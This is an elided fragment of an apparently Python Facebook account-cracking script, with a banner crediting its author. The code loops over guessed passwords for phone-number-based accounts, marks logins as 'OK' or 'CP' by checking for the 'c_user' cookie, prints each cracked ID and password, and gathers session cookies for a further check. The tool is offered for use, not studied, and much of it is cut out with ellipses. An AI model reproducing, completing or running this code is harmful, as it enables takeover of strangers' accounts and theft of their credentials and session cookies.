...
logo ="""\033[1;97m
       ...
       \033[1;33m##     ## #### ##     ## ######## 
\033[1;32m[+]==============================================
\033[1;32m[+] \033[1;33mCREATED BY   :  \033[1;33mMR.AYAAN 
\033[1;32m[+] \033[1;34mON FACEBOK   :  \033[1;34mMR.AYAAN 
\033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;35mAYAAN -143
...
def random_number():
    ...
    print('\033[1;32m[~] \033[1;32m92321,92300,92315,92318,92345 ETC\033[0;97m')
    print('\033[1;32m[+]==============================================')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;92m[AYAAN -OK] '+cid+' | '+ps+'\n[•] Useeagent: '+ua+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;95m[AYAAN -CP] '+cid+' | '+ps+'\033[0;97m')
                cek_apk(session,coki)
